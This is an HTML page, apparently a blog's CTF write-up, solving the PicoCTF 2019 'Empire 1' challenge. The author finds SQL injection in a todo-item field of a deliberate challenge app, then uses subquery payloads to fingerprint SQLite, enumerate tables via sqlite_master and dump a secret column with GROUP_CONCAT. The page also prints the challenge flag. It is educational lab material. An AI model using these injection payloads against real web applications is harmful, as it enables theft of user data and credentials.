@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.72.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || PicoCTF 2019 - Empire 1</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+</div>
+            </div>
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="main-column">
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">PicoCTF 2019 - Empire 1</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="June 7, 2020">
+      Jun 7
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/ctf">CTF</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series"></a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/web">web</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="description">Description</h1>
+<blockquote>
+<p>Psst, Agent 513, now that you&rsquo;re an employee of Evil Empire Co., try to get their secrets off the company website. <a href="https://2019shell1.picoctf.com/problem/12234/">https://2019shell1.picoctf.com/problem/12234/</a> (link) Can you first find the secret code they assigned to you? or <a href="http://2019shell1.picoctf.com">http://2019shell1.picoctf.com</a>:12234</p>
+</blockquote>
+<p>Hints:</p>
+<ul>
+<li>Pay attention to the feedback you get</li>
+<li>There is <em>very</em> limited filtering in place - this to stop you from breaking the challenge for yourself, not for you to bypass.</li>
+<li>The database gets reverted every 2 hours if you do break it, just come back later</li>
+</ul>
+<h1 id="solution">Solution</h1>
+<p>After browsing around on <a href="https://2019shell1.picoctf.com/problem/12234/,">https://2019shell1.picoctf.com/problem/12234/,</a> we have the following options:</p>
+<ul>
+<li>register an account</li>
+<li>login</li>
+</ul>
+<p>I couldn&rsquo;t trigger anything in these fields, moving on! Once we are connected, we have 3 pages:</p>
+<ul>
+<li><a href="https://2019shell1.picoctf.com/problem/12234/employee">https://2019shell1.picoctf.com/problem/12234/employee</a></li>
+<li><a href="https://2019shell1.picoctf.com/problem/12234/add_item">https://2019shell1.picoctf.com/problem/12234/add_item</a></li>
+<li><a href="https://2019shell1.picoctf.com/problem/12234/list_items">https://2019shell1.picoctf.com/problem/12234/list_items</a></li>
+</ul>
+<p>The employee page just displays an array of ID / username / name, not very interesting&hellip;</p>
+<p><img src="00_employee.png" alt=""></p>
+<p>But <code>add_item</code> and <code>list_item</code> have more potential! We have a text field to add a todo item, and we can view the result on the list item page.</p>
+<p><img src="00_create_todo.png" alt=""></p>
+<p><img src="00_view_todo.png" alt=""></p>
+<p>I tried JS/HTML execution in the TODO field, but it didn&rsquo;t trigger :(</p>
+<p><img src="00_html_js_injection.png" alt=""></p>
+<p>But! Putting a quote trigger a:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Internal Server Error
+The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
+</code></pre></div><p>=&gt; So, it&rsquo;s definitely a SQLi vulnerability! Probably an INSERT or an UPDATE query, not a SELECT, maybe something like:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">INSERT INTO notes (id,value) VALUES(1, &#39;my new todo&#39;);
+</code></pre></div><p>I tried a bunch of stuff that just returned &ldquo;Internal Server Error&rdquo;:</p>
+<ul>
+<li><code>, 'test')</code></li>
+<li><code>'test', 'test')</code></li>
+<li><code>'test'); -- </code></li>
+<li><code>'a' + 'b'</code></li>
+<li><code>')-- -</code></li>
+<li><code>'--</code></li>
+<li><code>'a' + 'b'</code></li>
+<li><code>'a' || 'b'</code></li>
+</ul>
+<p>I isolated the following that didn&rsquo;t crash <em>and</em> whose output is different:</p>
+<ul>
+<li>
+<p><code>+ '-' + =&gt; + ' +</code></p>
+</li>
+<li>
+<p><code>|| '-' || </code> =&gt; <code>|| ' ||</code></p>
+</li>
+<li>
+<p><code>' + 'test' + '123' +'</code> =&gt; <code>123</code></p>
+</li>
+<li>
+<p><code>'|| 'a' || 'b' ||'</code> =&gt; <code>ab</code></p>
+</li>
+</ul>
+<p>The most significant is the last one, where the query was executed, so we can try injection of the form: <code>'|| &lt;SQL stuff&gt; ||'</code></p>
+<p>Next, I tried to identify the database behind by querying the version:</p>
+<ul>
+<li><code>'||SELECT @@VERSION||'</code> for MSSQL and MySQL</li>
+<li><code>'||SELECT * FROM v$version||'</code> for Oracle</li>
+<li><code>'||SELECT version()||'</code> for PostgreSQL</li>
+<li><code>'||SELECT sqlite_version()||'</code> for SQLite</li>
+</ul>
+<p>All of these triggered an <code>Internal Server Error</code>, so my conclusion was either I missed something or they have a custom  database implemented. Given how popular this challenge is, I&rsquo;m very inclined to believe that something went wrong on my side&hellip;</p>
+<p>And&hellip; lots of digging on the internets later, I learned about the concept of <strong>subquery</strong>. Basically, a query in a query in a SQL statement. Let&rsquo;s look at an example from the <a href="https://mariadb.com/kb/en/subqueries-and-joins/">MariaDB knowledge base</a>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">table1</span> <span class="k">WHERE</span> <span class="n">col1</span> <span class="k">IN</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">col1</span> <span class="k">FROM</span> <span class="n">table2</span><span class="p">);</span>
+</code></pre></div><ul>
+<li><code>SELECT * FROM table1 WHERE col1 IN</code> is the main query</li>
+<li><code>(SELECT col1 FROM table2)</code> is the subquery, which is enclosed into parenthesis.</li>
+</ul>
+<p>The subquery is executed first and the results are substituted in the main query.</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">table1</span> <span class="k">WHERE</span> <span class="n">col1</span> <span class="k">IN</span> <span class="n">result1</span><span class="p">;</span>
+</code></pre></div><p>Then the main query is executed, just like any other SQL statements.</p>
+<p>And that&rsquo;s exactly what we should use to execute our version query:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39;||(select sqlite_version())||&#39;
+</code></pre></div><p><img src="01_sqlite_version.png" alt=""></p>
+<p>And there it is! We have confirmation that it&rsquo;s a SQLite database! And we can correct what we said earlier, injection are of the form: <code>|| ( &lt;SQL stuff&gt; ) ||</code>.</p>
+<p>Okay, next step: is there a way to retrieve the tables in that database? From the <a href="https://www.sqlite.org/faq.html#q7">SQLite FAQ</a>:</p>
+<blockquote>
+<p>(7) How do I list all tables/indices contained in an SQLite database</p>
+<p>If you are running the <strong>sqlite3</strong> command-line access program  you can type &ldquo;<strong>.tables</strong>&rdquo; to get a list of all tables.  Or you  can type &ldquo;<strong>.schema</strong>&rdquo; to see the complete database schema including  all tables and indices.  Either of these commands can be followed by  a LIKE pattern that will restrict the tables that are displayed.</p>
+<p>From within a C/C++ program (or a script using Tcl/Ruby/Perl/Python  bindings) you can get access to table and index names by doing a SELECT  on a special table named &ldquo;<strong>SQLITE_MASTER</strong>&rdquo;.  Every SQLite database  has an SQLITE_MASTER table that defines the schema for the database.  The SQLITE_MASTER table looks like this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">sqlite_master</span> <span class="p">(</span>
+<span class="k">type</span> <span class="nb">TEXT</span><span class="p">,</span>
+<span class="n">name</span> <span class="nb">TEXT</span><span class="p">,</span>
+<span class="n">tbl_name</span> <span class="nb">TEXT</span><span class="p">,</span>
+<span class="n">rootpage</span> <span class="nb">INTEGER</span><span class="p">,</span>
+<span class="k">sql</span> <span class="nb">TEXT</span>
+<span class="p">);</span>
+</code></pre></div><p>For tables, the <strong>type</strong> field will always be <strong>&lsquo;table&rsquo;</strong> and the  <strong>name</strong> field will be the name of the table.  So to get a list of  all tables in the database, use the following SELECT command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">sqlite_master</span>
+<span class="k">WHERE</span> <span class="k">type</span><span class="o">=</span><span class="s1">&#39;table&#39;</span>
+<span class="k">ORDER</span> <span class="k">BY</span> <span class="n">name</span><span class="p">;</span>
+</code></pre></div></blockquote>
+<p>Let&rsquo;s try it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT name FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; ORDER BY name)||&#39;</span>
+</code></pre></div><p><img src="02_sqlite_master.png" alt=""></p>
+<p>Ah. It might be that we are only getting the first result if the query returns several results&hellip; To list all results with only one line of output, we can ask for result 0, then result 1, then result 2:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT name FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; LIMIT 0,1)||&#39;</span>
+<span class="k">user</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT name FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; LIMIT 1,1)||&#39;</span>
+<span class="n">todo</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT name FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; LIMIT 2,1)||&#39;</span>
+<span class="k">None</span>
+</code></pre></div><p>So, we have 2 tables:  <code>user</code> and <code>todo</code>, let&rsquo;s go explore each of them:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT sql FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; LIMIT 0,1)||&#39;</span>
+<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="p">(</span> <span class="n">id</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">username</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">),</span> <span class="n">name</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">128</span><span class="p">),</span> <span class="n">password_hash</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">128</span><span class="p">),</span> <span class="n">secret</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">128</span><span class="p">),</span> <span class="k">admin</span> <span class="nb">INTEGER</span><span class="p">,</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">)</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT sql FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; LIMIT 1,1)||&#39;</span>
+<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">todo</span> <span class="p">(</span> <span class="n">id</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">item</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span> <span class="n">user_id</span> <span class="nb">INTEGER</span><span class="p">,</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">),</span> <span class="k">FOREIGN</span> <span class="k">KEY</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span> <span class="k">REFERENCES</span> <span class="k">user</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">)</span> 
+</code></pre></div><p>That secret column in the user table looks interesting!</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT secret FROM user LIMIT 0,1)||&#39;</span>
+<span class="n">Likes</span> <span class="n">Oreos</span><span class="p">.</span>
+<span class="s1">&#39;||(SELECT secret FROM user LIMIT 1,1)||&#39;</span>
+<span class="n">Know</span> <span class="n">it</span> <span class="k">all</span><span class="p">.</span>
+</code></pre></div><p>Huh. Not quite what I expected&hellip; <a href="https://stackoverflow.com/a/970506">StackOverflow to the rescue</a>, SQLite it not listed but its syntax is identical to MySQL:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;||(SELECT GROUP_CONCAT(secret) FROM user)||&#39;</span>
+</code></pre></div><p><img src="03_flag.png" alt=""></p>
+<p>Flag: <code>picoCTF{wh00t_it_a_sql_inject46527b2c} </code></p>
+<p>Links:</p>
+<ul>
+<li><a href="https://www.sqlinjection.net/database-fingerprinting/">https://www.sqlinjection.net/database-fingerprinting/</a></li>
+<li><a href="https://sqlwiki.netspi.com/dbmsIdentification">https://sqlwiki.netspi.com/dbmsIdentification</a></li>
+<li><a href="https://dl.packetstormsecurity.net/papers/database/SQLi_Insert.pdf">https://dl.packetstormsecurity.net/papers/database/SQLi_Insert.pdf</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html">https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html</a></li>
+<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StringConcat">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StringConcat</a></li>
+</ul>
+<p><img src="cat_roomba.gif" alt=""></p>
+
+        </div>
+    </article>
+</div>
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+    Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma, with lots of
+    
+        <a href="https://shiny-labs.re/credits/">awesome tools</a>.
+    
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
